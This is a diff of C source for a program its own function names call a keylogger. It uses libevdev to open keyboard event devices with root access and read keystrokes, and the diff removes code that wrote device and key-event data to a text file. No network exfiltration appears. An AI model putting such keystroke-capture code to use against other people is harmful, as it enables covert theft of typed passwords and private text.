@@ -30,13 +30,6 @@ void end_keylogger(void) {
 }
 
 void log_device(key_package* key_package) {
-  // open a file to write to. If it doesn't exist yet, this creates it
-  FILE* data_storage = fopen("data.txt", "w");
-  if (data_storage == NULL) {
-    perror("Error with opening the text file!");
-    exit(1);
-  }
-
   struct libevdev* dev;
   int rc;
 
@@ -50,7 +43,6 @@ void log_device(key_package* key_package) {
   rc = libevdev_new_from_fd(fd, &dev);
   if (rc < 0) {
     fprintf(stderr, "error with setting rc: %d %s\n", -rc, strerror(-rc));
-    fclose(data_storage);
     exit(0);
   }
 
@@ -59,17 +51,10 @@ void log_device(key_package* key_package) {
   //        libevdev_get_id_vendor(dev), libevdev_get_id_product(dev));
 
   // TODO: store this data in a struct
-  
-
-  // store data into text file
-  fprintf(data_storage, "Device: %s | vendor: %x | product: %x\n",
-          libevdev_get_name(dev), libevdev_get_id_vendor(dev),
-          libevdev_get_id_product(dev));
 
   // clean up
   libevdev_free(dev);
   close(fd);
-  fclose(data_storage);
 }
 
 void handle_syn_dropped(struct libevdev* dev) {
@@ -90,13 +75,6 @@ void handle_syn_dropped(struct libevdev* dev) {
 }
 
 void log_keys(key_package* key_package) {
-  // open a file to write to. If it doesn't exist yet, this creates it
-  FILE* data_storage = fopen("data.txt", "w");
-  if (data_storage == NULL) {
-    printf("Error with opening the text file!");
-    exit(1);
-  }
-
   // http://who-t.blogspot.com/2013/09/libevdev-handling-input-events.html
 
   // open a device, as libevdev expects a file descriptor. You should have root
@@ -115,7 +93,6 @@ void log_keys(key_package* key_package) {
   rc = libevdev_new_from_fd(keyboard_fd, &keyboard_dev);
   if (rc < 0) {
     fprintf(stderr, "error with setting rc: %d %s\n", -rc, strerror(-rc));
-    fclose(data_storage);
     exit(0);
   }
 
@@ -143,7 +120,6 @@ void log_keys(key_package* key_package) {
     rc = libevdev_new_from_fd(external_fd, &external_keyboard_dev);
     if (rc < 0) {
       fprintf(stderr, "error with setting rc for %s: %d %s\n", event_path, -rc, strerror(-rc));
-      fclose(data_storage);
       exit(0);
     }
     // check if the event represents a keyboard
@@ -221,11 +197,6 @@ void log_keys(key_package* key_package) {
         //         ev.value);
         // }
       }
-
-      // write to text file
-      // fprintf(data_storage, "Event: %d (%s) %d (%s) value: %d\n", ev.type,
-      //         libevdev_event_type_get_name(ev.type), ev.code,
-      //         libevdev_event_code_get_name(ev.type, ev.code), ev.value);
     } else {
       printf("unsure of what is going on here..\n");
     }
@@ -250,5 +221,4 @@ void log_keys(key_package* key_package) {
   // Clean up
   libevdev_free(keyboard_dev);
   close(keyboard_fd);
-  fclose(data_storage);
 }
